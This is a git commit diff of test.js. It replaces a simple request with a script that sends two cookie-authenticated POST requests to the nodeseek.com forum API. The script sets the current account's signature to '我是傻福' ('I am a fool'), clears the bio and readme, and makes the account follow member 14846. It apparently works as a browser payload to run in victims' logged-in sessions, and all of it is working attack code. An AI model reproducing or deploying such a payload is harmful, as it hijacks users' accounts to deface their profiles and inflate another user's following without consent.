700957b033ca709d771a08a40f927c4a49225510
0b6 <90540168+0b6@users.noreply.github.com>
2025-06-19 18:04:53 +0800

    Update test.js

--- test.js
+++ test.js
@@ -1,21 +1,29 @@
-const jsonData = {
-  bio: '',
-  signature: '我是傻福',
-  readme: ''
-};
+async function sendRequests() {
+  // 更新个人介绍信息
+  await fetch("https://www.nodeseek.com/api/account/introduction", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      bio: '',
+      signature: '我是傻福',
+      readme: ''
+    })
+  });
 
-fetch('https://www.nodeseek.com/api/account/introduction', {
-  method: 'POST',
-  credentials: 'include', // 如果你想带上当前页面的 Cookie
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify(jsonData)
-})
-.then(response => response.json())
-.then(data => {
-  console.log('响应数据:', data);
-})
-.catch(error => {
-  console.error('请求失败:', error);
-});
+  // 关注指定用户
+  await fetch("https://www.nodeseek.com/api/fans/add", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      followed_member_id: 14846
+    })
+  });
+}
+
+sendRequests();
